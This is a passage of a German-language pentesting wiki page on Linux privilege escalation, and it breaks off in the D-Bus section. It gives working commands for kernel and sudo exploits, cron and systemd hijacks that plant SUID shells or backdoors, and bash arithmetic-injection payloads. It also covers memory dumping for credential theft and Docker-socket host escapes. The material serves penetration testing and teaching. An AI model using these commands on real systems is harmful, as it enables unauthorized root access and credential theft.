# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Systeminformationen

### OS-Info

Fangen wir an, Informationen über das laufende OS zu sammeln.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Wenn du **Schreibrechte auf einen beliebigen Ordner in der `PATH`**-Variable hast, kannst du möglicherweise einige libraries oder binaries hijacken:
```bash
echo $PATH
```
### Env info

Interessante Informationen, Passwörter oder API-Schlüssel in den Umgebungsvariablen?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Überprüfe die Kernel-Version und ob es einen exploit gibt, der verwendet werden kann, um Privilegien zu eskalieren
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Du findest eine gute Liste verwundbarer Kernel und einige bereits **compiled exploits** hier: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) und [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Weitere Seiten, auf denen du einige **compiled exploits** findest: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Um alle verwundbaren Kernel-Versionen von dieser Webseite zu extrahieren, kannst du Folgendes tun:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools, die bei der Suche nach kernel exploits helfen können, sind:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (ausführen IN victim, überprüft nur exploits für kernel 2.x)

Suche immer **die kernel version in Google** — vielleicht ist deine kernel version in einem kernel exploit erwähnt und du kannst so sicherstellen, dass dieser exploit gültig ist.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo-Version

Basierend auf den anfälligen sudo-Versionen, die in den folgenden Einträgen erscheinen:
```bash
searchsploit sudo
```
Du kannst mit diesem grep prüfen, ob die sudo-Version verwundbar ist.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Von @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg Signaturprüfung fehlgeschlagen

Sieh dir die **smasher2 box of HTB** für ein **Beispiel** an, wie diese vuln ausgenutzt werden kann.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Mehr system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Mögliche Verteidigungsmaßnahmen auflisten

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Wenn du dich in einem docker container befindest, kannst du versuchen, daraus zu entkommen:


{{#ref}}
docker-security/
{{#endref}}

## Laufwerke

Prüfe **was gemountet und ungemountet ist**, wo und warum. Ist etwas nicht gemountet, kannst du versuchen, es zu mounten und nach privaten Informationen zu suchen.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nützliche Software

Nützliche binaries auflisten
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Prüfe außerdem, ob **ein Compiler installiert ist**. Das ist nützlich, falls du einen kernel exploit verwenden musst, da empfohlen wird, diesen auf der Maschine zu kompilieren, auf der du ihn einsetzen wirst (oder auf einer ähnlichen).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Verwundbare Software installiert

Überprüfe die **Version der installierten Pakete und Dienste**. Vielleicht gibt es eine ältere Nagios-Version (zum Beispiel), die ausgenutzt werden könnte, um escalating privileges zu erreichen…\
Es wird empfohlen, die Version der verdächtigeren installierten Software manuell zu überprüfen.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Wenn du SSH-Zugang zur Maschine hast, kannst du auch **openVAS** verwenden, um installierte, veraltete und verwundbare Software zu überprüfen.

> [!NOTE] > _Beachte, dass diese Befehle viele Informationen anzeigen, die größtenteils nutzlos sind, daher empfiehlt es sich, Anwendungen wie OpenVAS oder ähnliche zu verwenden, die überprüfen, ob installierte Softwareversionen gegenüber bekannten exploits verwundbar sind_

## Processes

Sieh dir an, **welche Prozesse** ausgeführt werden, und prüfe, ob ein Prozess **mehr Privilegien hat, als er sollte** (z. B. tomcat, das als root ausgeführt wird?)
```bash
ps aux
ps -ef
top -n 1
```
Überprüfe stets, ob mögliche [**electron/cef/chromium debuggers** laufen — du könntest sie missbrauchen, um Privilegien zu erhöhen](electron-cef-chromium-debugger-abuse.md). **Linpeas** erkennt diese, indem es den `--inspect` Parameter in der Kommandozeile des Prozesses prüft.\
Prüfe außerdem deine Privilegien bezüglich der Prozess-Binaries; vielleicht kannst du welche überschreiben.

### Prozessüberwachung

Du kannst Tools wie [**pspy**](https://github.com/DominicBreuker/pspy) verwenden, um Prozesse zu überwachen. Das kann sehr nützlich sein, um verwundbare Prozesse zu identifizieren, die häufig ausgeführt werden oder wenn bestimmte Bedingungen erfüllt sind.

### Prozessspeicher

Einige Dienste auf einem Server speichern **credentials im Klartext im Speicher**.\
Normalerweise benötigst du **root privileges**, um den Speicher von Prozessen zu lesen, die anderen Benutzern gehören; daher ist das meist nützlicher, wenn du bereits root bist und weitere credentials entdecken möchtest.\
Denke jedoch daran, dass **als normaler Benutzer du den Speicher der Prozesse, die dir gehören, lesen kannst**.

> [!WARNING]
> Beachte, dass heutzutage die meisten Maschinen **ptrace nicht standardmäßig erlauben**, was bedeutet, dass du andere Prozesse, die nicht zu deinem privilegierten Benutzer gehören, nicht dumpen kannst.
>
> Die Datei _**/proc/sys/kernel/yama/ptrace_scope**_ steuert die Zugänglichkeit von ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Skript
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Für eine gegebene Prozess-ID zeigen die **maps zeigen, wie der Speicher innerhalb des virtuellen Adressraums dieses Prozesses abgebildet ist**; sie zeigen auch die **Berechtigungen jeder abgebildeten Region**. Die Pseudo-Datei **mem** **legt den Speicher des Prozesses selbst offen**. Aus der **maps**-Datei wissen wir, welche **Speicherbereiche lesbar sind** und deren Offsets. Wir nutzen diese Informationen, um **in die mem-Datei zu seeken und alle lesbaren Bereiche zu dumpen** in eine Datei.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bietet Zugriff auf den **physischen** Speicher des Systems, nicht auf den virtuellen Speicher. Auf den virtuellen Adressraum des Kernels kann über /dev/kmem zugegriffen werden.\
Typischerweise ist `/dev/mem` nur für **root** und die kmem-Gruppe lesbar.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump ist eine Neuinterpretation für Linux des klassischen ProcDump-Tools aus der Sysinternals-Tool-Suite für Windows. Erhältlich unter [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Werkzeuge

Um den Speicher eines Prozesses auszulesen, können Sie folgende Tools verwenden:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Sie können die root-Anforderungen manuell entfernen und den Ihnen gehörenden Prozess auslesen
- Script A.5 aus [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root ist erforderlich)

### Anmeldeinformationen aus dem Prozessspeicher

#### Manuelles Beispiel

Wenn Sie feststellen, dass der authenticator-Prozess läuft:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Du kannst den Prozess dumpen (siehe die vorherigen Abschnitte, um verschiedene Möglichkeiten zu finden, den memory eines Prozesses zu dumpen) und im memory nach credentials suchen:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Das Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) wird **Klartext-Anmeldeinformationen aus dem Speicher** und aus einigen **bekannten Dateien** stehlen. Es benötigt Root-Rechte, um korrekt zu funktionieren.

| Funktion                                          | Prozessname          |
| ------------------------------------------------- | -------------------- |
| GDM-Passwort (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktive FTP-Verbindungen)                  | vsftpd               |
| Apache2 (aktive HTTP Basic-Auth-Sitzungen)        | apache2              |
| OpenSSH (aktive SSH-Sitzungen - Sudo-Nutzung)     | sshd:                |

#### Such-Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geplante/Cron-Jobs

Prüfe, ob ein geplanter Job angreifbar ist. Vielleicht kannst du ein Skript ausnutzen, das von root ausgeführt wird (wildcard vuln? kann man Dateien ändern, die root verwendet? symlinks nutzen? bestimmte Dateien im Verzeichnis erstellen, das root verwendet?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron-Pfad

Zum Beispiel findest du in _/etc/crontab_ den PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Beachte, dass der Benutzer "user" Schreibrechte über /home/user_)

Wenn innerhalb dieser crontab der root user versucht, einen Befehl oder ein Skript auszuführen, ohne den PATH zu setzen. Zum Beispiel: _\* \* \* \* root overwrite.sh_\
Dann kannst du eine root shell erhalten, indem du Folgendes verwendest:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron, das ein script mit einem wildcard verwendet (Wildcard Injection)

Wenn ein script als root ausgeführt wird und ein “**\***” in einem Befehl enthalten ist, kannst du das ausnutzen, um unerwartete Dinge zu verursachen (wie privesc). Beispiel:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wenn das wildcard einem Pfad wie** _**/some/path/\***_ **vorausgeht, ist es nicht verwundbar (auch** _**./\***_ **nicht).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash führt parameter expansion und command substitution vor der arithmetischen Auswertung in ((...)), $((...)) und let aus. Wenn ein root cron/parser nicht vertrauenswürdige Log-Felder liest und in einen arithmetischen Kontext einspeist, kann ein Angreifer eine command substitution $(...) injizieren, die beim Ausführen des cron als root läuft.

- Warum es funktioniert: In Bash erfolgen die Expansions in dieser Reihenfolge: parameter/variable expansion, command substitution, arithmetic expansion, dann word splitting und pathname expansion. Daher wird ein Wert wie `$(/bin/bash -c 'id > /tmp/pwn')0` zuerst substituiert (der Befehl wird ausgeführt), danach wird die verbleibende Zahl `0` für die arithmetische Operation verwendet, sodass das Script ohne Fehler weiterläuft.

- Typisches verwundbares Muster:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Sorge dafür, dass vom Angreifer kontrollierter Text in das geparste Log geschrieben wird, sodass das zahlenähnliche Feld eine command substitution enthält und mit einer Ziffer endet. Stelle sicher, dass dein Befehl nichts auf stdout schreibt (oder leite es um), damit die arithmetische Auswertung gültig bleibt.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Wenn du **ein cron script modifizieren kannst**, das als root ausgeführt wird, kannst du sehr einfach eine Shell erhalten:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Wenn das von root ausgeführte script ein Verzeichnis verwendet, auf das du vollen Zugriff hast, könnte es nützlich sein, diesen folder zu löschen und stattdessen einen symlink folder zu erstellen, der auf ein anderes Verzeichnis zeigt, das ein von dir kontrolliertes script bereitstellt.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Häufige cron jobs

Du kannst die Prozesse überwachen, um nach Prozessen zu suchen, die alle 1, 2 oder 5 Minuten ausgeführt werden. Vielleicht kannst du das ausnutzen und escalate privileges.

Zum Beispiel, um **jede 0.1s für 1 Minute zu überwachen**, **nach den am wenigsten ausgeführten Befehlen zu sortieren** und die Befehle zu löschen, die am häufigsten ausgeführt wurden, kannst du folgendes tun:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**You can also use** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dies überwacht und listet jeden gestarteten Prozess).

### Unsichtbare cron jobs

Es ist möglich, einen cronjob zu erstellen, indem man **einen carriage return nach einem Kommentar setzt** (ohne newline character), und der cron job wird funktionieren. Beispiel (achte auf das carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Beschreibbare _.service_ Dateien

Prüfe, ob du irgendeine `.service` Datei schreiben kannst. Falls ja, **könntest du sie ändern**, sodass sie deine **backdoor ausführt**, wenn der Dienst **gestartet**, **neu gestartet** oder **gestoppt** wird (vielleicht musst du warten, bis die Maschine neu gebootet wird).\
Zum Beispiel kannst du deine Backdoor innerhalb der .service Datei mit **`ExecStart=/tmp/script.sh`** einbauen.

### Beschreibbare service-Binaries

Beachte, dass wenn du **Schreibrechte auf Binärdateien hast, die von Services ausgeführt werden**, du diese für backdoors ändern kannst, sodass beim erneuten Ausführen der Services die backdoors ausgeführt werden.

### systemd PATH - Relative Pfade

Du kannst den von **systemd** verwendeten PATH sehen mit:
```bash
systemctl show-environment
```
Wenn Sie feststellen, dass Sie in einen der Ordner des Pfads **schreiben** können, könnten Sie möglicherweise **escalate privileges**. Sie müssen nach **relative paths being used on service configurations** Dateien suchen wie:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Erstelle dann ein **executable** mit dem **same name as the relative path binary** im systemd PATH-Ordner, den du beschreiben kannst, und wenn der Service aufgefordert wird, die verwundbare Aktion (**Start**, **Stop**, **Reload**) auszuführen, wird deine **backdoor will be executed** (nicht-privilegierte Benutzer können Services normalerweise nicht starten/stoppen, prüfe aber, ob du `sudo -l` verwenden kannst).

**Erfahre mehr über Services mit `man systemd.service`.**

## **Timers**

**Timers** sind systemd Unit-Dateien, deren Name auf `**.timer**` endet und die `**.service**`-Dateien oder Ereignisse steuern. **Timers** können als Alternative zu cron verwendet werden, da sie eingebaute Unterstützung für kalenderbasierte Zeitereignisse und monotone Zeitereignisse bieten und asynchron ausgeführt werden können.

Du kannst alle Timer mit:
```bash
systemctl list-timers --all
```
### Schreibbare Timer

Wenn du einen Timer ändern kannst, kannst du ihn dazu bringen, einige vorhandene Einträge in systemd.unit (wie eine `.service` oder eine `.target`) auszuführen.
```bash
Unit=backdoor.service
```
In der Dokumentation kannst du lesen, was die Unit ist:

> Die Unit, die aktiviert wird, wenn dieser Timer abläuft. Das Argument ist ein Unit-Name, dessen Suffix nicht ".timer" ist. Falls nicht angegeben, ist dieser Wert standardmäßig ein service, der denselben Namen wie die timer unit hat, abgesehen vom Suffix. (Siehe oben.) Es wird empfohlen, dass der Unit-Name, der aktiviert wird, und der Unit-Name der timer unit identisch benannt sind, abgesehen vom Suffix.

Daher müsstest du, um diese Berechtigung auszunutzen:

- Eine systemd unit (z. B. eine `.service`) finden, die ein **beschreibbares Binary ausführt**
- Eine systemd unit finden, die einen **relativen Pfad ausführt** und auf den du **schreibbare Berechtigungen** für den **systemd PATH** hast (um diese ausführbare Datei zu imitieren)

**Mehr über Timer erfährst du mit `man systemd.timer`.**

### **Timer aktivieren**

Um einen Timer zu aktivieren, benötigst du root-Rechte und musst ausführen:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Beachte, dass der **timer** durch das Erstellen eines Symlinks zu ihm unter `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` **aktiviert** wird.

## Sockets

Unix Domain Sockets (UDS) ermöglichen **Prozesskommunikation** auf derselben oder auf verschiedenen Maschinen innerhalb von client-server-Modellen. Sie nutzen standardmäßige Unix-Deskriptordateien für die Kommunikation zwischen Rechnern und werden über `.socket`-Dateien eingerichtet.

Sockets können mit `.socket`-Dateien konfiguriert werden.

**Mehr über sockets mit `man systemd.socket` erfahren.** In dieser Datei können mehrere interessante Parameter konfiguriert werden:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen unterscheiden sich, aber zusammenfassend werden sie verwendet, um **anzugeben, wo der Socket lauschen wird** (der Pfad der AF_UNIX-Socket-Datei, die IPv4/6-Adresse und/oder Portnummer, etc.).
- `Accept`: Nimmt ein boolean-Argument. Wenn **true**, wird für jede eingehende Verbindung eine **service instance** gestartet und nur der Verbindungs-Socket an diese übergeben. Wenn **false**, werden alle listening sockets selbst **an die gestartete service unit übergeben**, und es wird nur eine service unit für alle Verbindungen gestartet. Dieser Wert wird für Datagram-Sockets und FIFOs ignoriert, wo eine einzelne service unit bedingungslos allen eingehenden Traffic behandelt. **Standard: false**. Aus Performance-Gründen wird empfohlen, neue Daemons so zu schreiben, dass sie für `Accept=no` geeignet sind.
- `ExecStartPre`, `ExecStartPost`: Nimmt eine oder mehrere Kommandozeilen, die jeweils **ausgeführt werden, bevor** bzw. **nachdem** die listening **sockets**/FIFOs **erstellt** und gebunden werden. Das erste Token der Kommandozeile muss ein absoluter Dateiname sein, gefolgt von Argumenten für den Prozess.
- `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die **ausgeführt werden, bevor** bzw. **nachdem** die listening **sockets**/FIFOs **geschlossen** und entfernt werden.
- `Service`: Gibt den Namen der **service** unit an, die bei **eingehendem Traffic** aktiviert werden soll. Diese Einstellung ist nur für Sockets mit Accept=no erlaubt. Standardmäßig ist es die Service-Einheit mit demselben Namen wie der Socket (mit entsprechend ersetztem Suffix). In den meisten Fällen sollte es nicht notwendig sein, diese Option zu verwenden.

### Writable .socket files

Wenn du eine **beschreibbare** `.socket`-Datei findest, kannst du am Anfang der `[Socket]`-Sektion etwas wie `ExecStartPre=/home/kali/sys/backdoor` hinzufügen und die Backdoor wird ausgeführt, bevor der Socket erstellt wird. Daher wirst du **wahrscheinlich warten müssen, bis die Maschine neu gestartet wird**.\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

Wenn du einen **beschreibbaren Socket** identifizierst (_hier sprechen wir jetzt über Unix Sockets und nicht über die Konfig-`.socket`-Dateien_), dann **kannst du mit diesem Socket kommunizieren** und vielleicht eine Schwachstelle ausnutzen.

### Unix Sockets auflisten
```bash
netstat -a -p --unix
```
### Rohverbindung
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Beachte, dass es möglicherweise einige **sockets listening for HTTP** requests gibt (_Ich spreche nicht von .socket files, sondern von Dateien, die als unix sockets fungieren_). Du kannst das mit folgendem prüfen:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Wenn der Socket **mit einer HTTP-Anfrage antwortet**, kannst du **mit ihm kommunizieren** und vielleicht **exploit some vulnerability**.

### Schreibbarer Docker Socket

Der Docker-Socket, häufig zu finden unter `/var/run/docker.sock`, ist eine kritische Datei, die gesichert werden sollte. Standardmäßig ist er vom Benutzer `root` und Mitgliedern der Gruppe `docker` schreibbar. Schreibzugriff auf diesen Socket kann zu Privilege Escalation führen. Hier ist eine Aufschlüsselung, wie das gemacht werden kann und alternative Methoden, falls die Docker CLI nicht verfügbar ist.

#### **Privilege Escalation with Docker CLI**

Wenn du Schreibzugriff auf den Docker-Socket hast, kannst du Privilege Escalation durchführen, indem du die folgenden Befehle ausführst:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Mit diesen Befehlen können Sie einen Container starten, der Root-Zugriff auf das Dateisystem des Hosts hat.

#### **Docker API direkt verwenden**

Falls die Docker-CLI nicht verfügbar ist, kann der Docker-Socket weiterhin über die Docker API und `curl`-Befehle manipuliert werden.

1.  **List Docker Images:** Ruft die Liste der verfügbaren Images ab.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Sende eine Anfrage, um einen Container zu erstellen, der das Root-Verzeichnis des Hosts einhängt.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Verwenden Sie `socat`, um eine Verbindung zum Container herzustellen und Befehle darin auszuführen.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nach dem Einrichten der `socat`-Verbindung können Sie Befehle direkt im Container ausführen und erhalten Root-Zugriff auf das Dateisystem des Hosts.

### Others

Beachten Sie, dass wenn Sie Schreibberechtigungen für den docker socket haben, weil Sie **in der Gruppe `docker`** sind, Sie [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Wenn die [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Siehe **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Wenn Sie feststellen, dass Sie den **`ctr`**-Befehl verwenden können, lesen Sie die folgende Seite, da **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Wenn Sie den **`runc`**-Befehl verwenden können, lesen Sie die folgende Seite, da **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ist ein ausgeklügeltes **inter-Process Communication (IPC) system**, das Anwendungen ermöglicht, effizient zu interagieren und Daten auszutauschen. Es wurde für moderne Linux-Systeme entwickelt und bietet ein robustes Framework für verschiedene Formen der Anwendungskommunikation.

Das System ist vielseitig und unterstützt grundlegendes IPC, das den Datenaustausch zwischen Prozessen verbessert, ähnlich wie bei **enhanced UNIX domain sockets**. Außerdem unterstützt es das Senden von Ereignissen oder Signalen und fördert so die nahtlose Integration von Systemkomponenten. Beispielsweise kann ein Signal eines Bluetooth-Daemons über einen eingehenden Anruf einen Musikplayer stummschalten und so das Nutzererlebnis verbessern. Darüber hinaus unterstützt D-Bus ein Remote-Object-System, das Serviceanfragen und Methodenaufrufe zwischen Anwendungen vereinfacht und Abläufe strafft, die zuvor komplex waren.

D-Bus arbeitet nach einem **allow/deny model** und verwaltet Nachrichtenberechtigungen (Methodenaufrufe, Signalübermittlungen usw.) basierend auf der kumulativen Wirkung passender Policy-Regeln. Diese Policies legen fest, welche Interaktionen mit dem Bus erlaubt sind und können durch Ausnutzung dieser Berechtigungen potenziell zu privilege escalation führen.

Ein Beispiel für eine solche Policy in `/etc/dbus-1/system.d/wpa_supplicant.conf` zeigt Berechtigungen, die dem root-Benutzer erlauben, `fi.w1.wpa_supplicant1` zu besitzen, an es zu senden und Nachrichten davon zu empfangen.

Policies ohne einen spezifizierten Benutzer oder eine Gruppe gelten universell, während "default"-Kontext-Policies für alle gelten, die nicht von anderen spezifischen Policies abgedeckt sind.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
